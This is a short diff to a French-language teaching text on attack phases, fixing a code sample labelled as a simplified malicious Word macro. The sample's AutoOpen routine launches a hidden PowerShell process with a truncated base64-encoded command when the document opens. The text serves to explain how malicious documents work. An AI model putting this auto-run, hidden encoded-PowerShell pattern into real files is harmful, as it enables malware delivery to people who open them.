@@ -45,8 +45,8 @@ Phase où l'attaquant active son code malveillant après avoir infiltré le syst
    Exemple : `CVE-2023-1234` (dépassement de tampon)
 
 2. **Documents malveillants**  
-   ```python
-   # Macro Word malveillante simplifiée
+   ```vba
+   ' Macro Word malveillante simplifiée
    Sub AutoOpen()
-       Shell("cmd /c powershell -nop -w hidden -e JABzAD0A...")
+       Shell "cmd /c powershell -nop -w hidden -e JABzAD0A..."
    End Sub
